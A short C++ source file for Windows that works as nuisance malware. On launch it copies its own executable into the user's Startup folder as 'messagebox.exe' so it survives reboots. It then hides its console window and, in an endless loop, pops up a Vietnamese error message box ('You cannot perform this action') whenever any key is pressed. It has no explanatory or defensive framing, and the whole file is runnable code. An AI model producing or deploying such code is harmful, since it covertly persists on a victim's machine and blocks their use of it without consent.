#include <iostream>
#include <Windows.h>
#include <fstream>
#pragma comment(lib, "User32.lib")
using namespace std;

string username = getenv("username");
string startup = "C:\\Users\\" + username + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";

int main(int argc, char **argv)
{
    string cpfile = startup + "\\" + "messagebox.exe";
    ifstream tf(argv[0], ios::binary);
    ofstream sf(cpfile, ios::binary);
    sf << tf.rdbuf();
    tf.close();
    sf.close();
    HWND console = GetConsoleWindow();
    ShowWindow(console, SW_HIDE);
    while (true)
    {
        for (int key = 8; key <= 255; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                MessageBoxW(NULL, L"Bạn không thể thực hiện được hành động này", L"Error", MB_OKCANCEL | MB_ICONERROR);
            }
        }
        Sleep(3);
    }
    return 0;
}
